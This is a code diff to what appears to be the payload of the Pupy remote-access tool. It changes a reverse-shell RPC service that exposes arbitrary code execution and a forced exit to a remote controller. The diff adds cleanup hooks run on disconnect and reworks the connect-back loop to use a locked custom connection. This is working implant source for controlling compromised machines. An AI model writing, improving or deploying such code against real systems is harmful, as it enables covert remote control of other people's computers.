@@ -58,6 +58,7 @@ import json
 import argparse
 from network import conf
 from network.lib.base_launcher import LauncherError
+from network.lib.connection import PupyConnection
 import logging
 import shlex
 import marshal
@@ -74,23 +75,19 @@ except Exception as e:
 
 logging.getLogger().setLevel(logging.WARNING)
 
-def add_pseudo_pupy_module():
-    """ add a pseudo pupy module for *nix payloads """
-    if not "pupy" in sys.modules:
+try:
+    import pupy
+except ImportError:
+    pass
+
+if 'pupy' not in sys.modules:
+    if not 'pupy' in sys.modules:
         mod = imp.new_module("pupy")
         mod.__name__ = "pupy"
         mod.__file__ = "<memimport>\\\\pupy"
         mod.__package__ = "pupy"
         sys.modules["pupy"] = mod
         mod.pseudo = True
-try:
-    import pupy
-except ImportError:
-    if "pupy" not in sys.modules:
-        add_pseudo_pupy_module()
-
-if "pupy" not in sys.modules:
-    add_pseudo_pupy_module()
 
 import pupy
 pupy.infos = {}  # global dictionary to store informations persistent through a deconnection
@@ -123,24 +120,39 @@ class UpdatableModuleNamespace(ModuleNamespace):
 
 class ReverseSlaveService(Service):
     """ Pupy reverse shell rpyc service """
-    __slots__ = ["exposed_namespace"]
+    __slots__ = ["exposed_namespace", "exposed_cleanups"]
 
     def on_connect(self):
         self.exposed_namespace = {}
+        self.exposed_cleanups = []
         self._conn._config.update(REVERSE_SLAVE_CONF)
         self._conn.root.set_modules(
             UpdatableModuleNamespace(self.exposed_getmodule))
 
     def on_disconnect(self):
         print "disconnecting !"
+        for cleanup in self.exposed_cleanups:
+            try:
+                cleanup()
+            except Exception as e:
+                logging.exception(e)
+
+        self.exposed_cleanups = []
+
         try:
             self._conn.close()
-        except:
-            pass
-        raise
+        except Exception as e:
+            logging.exception(e)
+            raise
 
     def exposed_exit(self):
         os._exit(0)
+
+    def exposed_register_cleanup(self, method):
+        self.exposed_cleanups.append(method)
+
+    def exposed_unregister_cleanup(self, method):
+        self.exposed_cleanups.remove(method)
 
     def exposed_execute(self, text):
         """execute arbitrary code (using ``exec``)"""
@@ -173,6 +185,7 @@ class BindSlaveService(ReverseSlaveService):
 
     def on_connect(self):
         self.exposed_namespace = {}
+        self.exposed_cleanups = []
         self._conn._config.update(REVERSE_SLAVE_CONF)
         import pupy
         try:
@@ -325,17 +338,22 @@ def rpyc_loop(launcher):
                 t.daemon = True
                 t.start()
 
+                lock = threading.RLock()
+                conn = None
+
                 try:
-                    conn = rpyc.utils.factory.connect_stream(
-                        stream,
-                        ReverseSlaveService, {}
+                    conn = PupyConnection(
+                        lock, None, ReverseSlaveService,
+                        rpyc.Channel(stream), config={}
                     )
+                    conn._init_service()
                 finally:
                     event.set()
 
                 attempt = 0
-                while True:
-                    conn.serve(None)
+                with lock:
+                    while not conn.closed:
+                        conn.serve(10)
 
         except SystemExit:
             raise
